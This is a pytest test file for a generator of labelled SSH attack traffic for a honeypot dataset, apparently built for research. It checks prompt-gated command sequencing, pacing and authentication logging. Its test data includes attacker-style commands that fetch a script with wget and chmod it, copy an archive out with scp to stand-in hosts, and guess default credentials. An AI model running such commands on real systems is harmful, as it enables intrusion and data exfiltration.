"""Category-independent pacing and prompt-gated sequencing in dataset_builder/generate_labelled_traffic.py.

No Cowrie: tests/generator_fakes.py supplies a fake SSH client and an emulated shell, and one test runs
a local paramiko shell server on 127.0.0.1 to exercise the real channel API.
"""
import dataclasses
import inspect
import json
import socket
import sys
import threading

import paramiko
import pytest

from dataset_builder import generate_labelled_traffic as glt
from generator_fakes import FakeShell, install

FAST = glt.ReadinessPolicy(prompt_timeout_s=0.3, exit_timeout_s=0.2, poll_interval_s=0.001)


def _run(commands, attempts=(("root", "toor"),), seed=1, index=1, readiness=FAST):
    return glt.run_session("h", 1, [list(a) for a in attempts], list(commands), glt.PacingPolicy(),
                           glt.session_pacing_rng(seed, index), readiness)


def _shell(**kwargs):
    return lambda: FakeShell(**kwargs)


# --- pacing policy -------------------------------------------------------------------------------

def test_pacing_policy_has_no_category_or_profile_parameters():
    fields = {f.name for f in dataclasses.fields(glt.PacingPolicy)}
    assert fields == {"think_median_s", "think_sigma", "think_min_s", "think_max_s",
                      "auth_gap_min_s", "auth_gap_max_s", "speed"}
    params = set(inspect.signature(glt.run_session).parameters)
    assert params == {"host", "port", "attempts", "commands", "pacing", "pacing_rng", "readiness"}
    source = inspect.getsource(glt.run_session) + inspect.getsource(glt.PacingPolicy)
    for forbidden in ("delay_range", "attack_cat", "profile[", "label"):
        assert forbidden not in source


def test_same_pacing_seed_reproduces_think_times_and_different_seeds_differ():
    policy = glt.PacingPolicy()

    def draw(seed, index):
        rng = glt.session_pacing_rng(seed, index)
        return [policy.think_time(rng) for _ in range(20)]

    assert draw(42, 3) == draw(42, 3)
    assert draw(42, 3) != draw(43, 3)
    assert draw(42, 3) != draw(42, 4)


def test_think_times_respect_the_documented_bounds_and_speed():
    policy, rng = glt.PacingPolicy(), glt.session_pacing_rng(5, 1)
    values = [policy.think_time(rng) for _ in range(2000)]
    assert min(values) >= policy.think_min_s and max(values) <= policy.think_max_s
    fast, rng2 = glt.PacingPolicy(speed=4.0), glt.session_pacing_rng(5, 1)
    assert [fast.think_time(rng2) for _ in range(2000)] == pytest.approx([v / 4.0 for v in values])


# --- readiness and sequencing --------------------------------------------------------------------

def test_every_command_is_sent_only_after_the_prompt_returned(monkeypatch):
    fake = install(monkeypatch, glt)
    record = _run(["uname -a", "id", "w"])
    received = fake.instances[0].shell.received
    assert [line for line, _ in received] == ["uname -a", "id", "w", "exit"]
    assert all(ready for _, ready in received)
    assert record["termination"] == "clean_exit" and record["exit_confirmed"] is True
    assert all(e["ready_before_send"] and e["prompt_returned"] for e in record["command_log"])


def test_slow_blocking_command_is_waited_for_before_the_next_command(monkeypatch):
    fake = install(monkeypatch, glt, shell_factory=_shell(behaviours={"wget": "slow"}, slow_polls=20))
    record = _run(["wget http://192.0.2.10/b.sh", "chmod +x b.sh"])
    received = fake.instances[0].shell.received
    assert [line for line, _ in received] == ["wget http://192.0.2.10/b.sh", "chmod +x b.sh", "exit"]
    assert all(ready for _, ready in received)
    assert record["command_log"][0]["blocking_expected"] is True
    assert record["command_log"][0]["prompt_returned"] is True
    assert record["status"] == "ok"


def test_hanging_command_terminates_the_session_and_nothing_more_is_sent(monkeypatch):
    fake = install(monkeypatch, glt, shell_factory=_shell(behaviours={"scp": "hang"}))
    record = _run(["cd /tmp", "scp d.tar root@192.0.2.5:/tmp/", "rm -f d.tar"])
    shell, log = fake.instances[0].shell, record["command_log"]
    assert [line for line, _ in shell.received] == ["cd /tmp", "scp d.tar root@192.0.2.5:/tmp/"]  # no rm, no exit
    assert record["commands_sent"] == ["cd /tmp", "scp d.tar root@192.0.2.5:/tmp/"]
    assert log[1]["status"] == "readiness_timeout" and log[1]["prompt_returned"] is False
    assert log[1]["action"] == "terminate_session"
    assert log[2]["sent"] is False and log[2]["status"] == "not_sent_after_termination"
    assert record["termination"] == "readiness_timeout" and record["status"] == "incomplete"
    assert record["exit_sent"] is False
    assert fake.instances[0].closed == 1


def test_channel_closed_by_server_is_recorded(monkeypatch):
    install(monkeypatch, glt, shell_factory=_shell(behaviours={"reboot": "close"}))
    record = _run(["reboot", "id"])
    assert record["command_log"][0]["status"] == "readiness_channel_closed"
    assert record["command_log"][1]["status"] == "not_sent_after_termination"
    assert record["termination"] == "readiness_channel_closed"


def test_initial_prompt_timeout_sends_no_commands(monkeypatch):
    fake = install(monkeypatch, glt, shell_factory=_shell(initial_prompt=False))
    record = _run(["id", "w"])
    assert fake.instances[0].shell.received == []
    assert record["shell_ready_initial"] is False and record["termination"] == "shell_not_ready"
    assert record["commands_sent"] == [] and all(not e["sent"] for e in record["command_log"])
    assert record["status"] == "incomplete" and fake.instances[0].closed == 1


def test_exit_without_channel_close_is_recorded_as_unconfirmed(monkeypatch):
    install(monkeypatch, glt, shell_factory=_shell(close_on_exit=False))
    record = _run(["id"])
    assert record["exit_sent"] is True and record["exit_confirmed"] is False
    assert record["termination"] == "exit_unconfirmed"


# --- authentication ------------------------------------------------------------------------------

def test_authentication_log_records_rejections_and_the_accepted_login(monkeypatch):
    rejected = paramiko.AuthenticationException("Authentication failed.")
    fake = install(monkeypatch, glt, outcomes=[rejected, rejected, None])
    record = _run(["id"], attempts=(("scan", "123456"), ("scan", "admin"), ("root", "toor")))
    assert [(a["username"], a["outcome"]) for a in record["auth_log"]] == [
        ("scan", "rejected"), ("scan", "rejected"), ("root", "accepted")]
    assert record["auth_success"] is True
    assert [c.closed for c in fake.instances] == [1, 1, 1]


def test_final_authentication_failure_sends_nothing(monkeypatch):
    fake = install(monkeypatch, glt, outcomes=[paramiko.AuthenticationException("Authentication failed.")])
    record = _run(["id"])
    assert record["termination"] == "auth_failed" and record["status"] == "error"
    assert record["auth_log"][-1]["outcome"] == "rejected"
    assert record["commands_sent"] == [] and record["command_log"][0]["status"] == "not_sent"
    assert fake.instances[0].closed == 1


# --- end to end through main(): manifest accuracy and category independence ----------------------

def test_main_uses_one_pacing_policy_for_all_categories_and_writes_an_accurate_manifest(tmp_path, monkeypatch):
    fake = install(monkeypatch, glt)
    config = {"version": "test", "placeholders": {}, "profiles": [
        {"name": "slow_admin", "attack_cat": "privilege_escalation", "label": 1, "delay_range": [1000.0, 2000.0],
         "credentials": {"usernames": ["admin"], "passwords": ["x"], "failed_attempts": [0, 0]},
         "steps": [["uptime"], ["w"]]},
        {"name": "fast_bot", "attack_cat": "botnet", "label": 1, "delay_range": [0.0, 0.0],
         "credentials": {"usernames": ["root"], "passwords": ["y"], "failed_attempts": [0, 0]},
         "steps": [["uname -a"], ["id"]]},
    ]}
    cfg = tmp_path / "profiles.json"
    cfg.write_text(json.dumps(config), encoding="utf-8")
    out = tmp_path / "run"
    monkeypatch.setattr(sys, "argv", ["generate_labelled_traffic.py", "--config", str(cfg), "--sessions", "12",
                                      "--seed", "7", "--pacing-seed", "7", "--no-baseline", "--output-dir", str(out),
                                      "--prompt-timeout", "0.3"])
    glt.main()

    meta = json.loads((out / "run_meta.json").read_text(encoding="utf-8"))
    assert meta["pacing_seed"] == 7 and meta["pacing_policy"] == glt.PacingPolicy().describe()
    assert meta["generator_version"] == glt.GENERATOR_VERSION
    entries = [json.loads(line) for line in (out / "manifest.jsonl").read_text(encoding="utf-8").splitlines()]
    assert len(entries) == 12 and {e["attack_cat"] for e in entries} == {"privilege_escalation", "botnet"}

    policy = glt.PacingPolicy()
    for entry in entries:
        # Think times are exactly the session's own pacing stream: the profile's delay_range
        # (1000-2000 s vs 0 s) has no effect, and the category is never consulted.
        rng = glt.session_pacing_rng(7, entry["index"])
        assert entry["pacing_stream"] == f"pacing:7:{entry['index']}"
        expected = [round(policy.think_time(rng), 4) for _ in entry["command_log"]]
        assert [c["think_time_s"] for c in entry["command_log"]] == expected
        assert all(policy.think_min_s <= t <= policy.think_max_s for t in expected)
        # Manifest accuracy: what was sent is exactly what the shell received, in order.
        sent = [c["command"] for c in entry["command_log"] if c["sent"]]
        assert entry["commands_sent"] == sent == entry["commands_planned"]
        assert all(c["sent_utc"] and c["prompt_returned"] for c in entry["command_log"])
        assert entry["termination"] == "clean_exit"
    shells = [c.shell for c in fake.instances]
    assert [[line for line, _ in s.received][:-1] for s in shells] == [e["commands_sent"] for e in entries]
    assert all(c.closed == 1 for c in fake.instances)


# --- real paramiko channel against a local shell server (no Cowrie, loopback only) ---------------

class _ShellServer(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED

    def check_channel_pty_request(self, *args):
        return True

    def check_channel_shell_request(self, channel):
        return True


def _serve_shell(hang_on):
    """One connection: Cowrie-like prompt, echo + newline per line; never answers `hang_on`; closes on exit."""
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    seen = []

    def serve():
        conn, _ = listener.accept()
        transport = paramiko.Transport(conn)
        transport.add_server_key(paramiko.RSAKey.generate(2048))
        transport.start_server(server=_ShellServer())
        chan = transport.accept(10)
        chan.send(b"\x1b[4hroot@svr04:~# ")
        buffer = b""
        while not chan.closed:
            data = chan.recv(1024)
            if not data:
                break
            buffer += data
            while b"\n" in buffer:
                line, buffer = buffer.split(b"\n", 1)
                seen.append(line.decode())
                if line == b"exit":
                    chan.send_exit_status(0)
                    chan.close()
                    break
                chan.send(line + b"\r\n")
                if line.split()[0].decode() != hang_on:
                    chan.send(b"\x1b[4hroot@svr04:~# ")
        transport.close()
        listener.close()

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    return listener.getsockname()[1], thread, seen


@pytest.mark.parametrize("hang_on, expected_seen, termination", [
    (None, ["uname -a", "id", "exit"], "clean_exit"),
    ("scp", ["uname -a", "scp d.tar root@192.0.2.5:/tmp/"], "readiness_timeout"),
])
def test_real_paramiko_channel_prompt_gating(hang_on, expected_seen, termination):
    port, thread, seen = _serve_shell(hang_on)
    commands = ["uname -a", "id"] if hang_on is None else ["uname -a", "scp d.tar root@192.0.2.5:/tmp/", "id"]
    policy = glt.PacingPolicy(think_min_s=0.01, think_median_s=0.02, think_max_s=0.05)
    readiness = glt.ReadinessPolicy(prompt_timeout_s=1.0, exit_timeout_s=2.0, poll_interval_s=0.01)
    record = glt.run_session("127.0.0.1", port, [["root", "x"]], commands, policy,
                             glt.session_pacing_rng(1, 1), readiness)
    thread.join(10)
    assert seen == expected_seen
    assert record["termination"] == termination
    assert record["commands_sent"] == [line for line in expected_seen if line != "exit"]
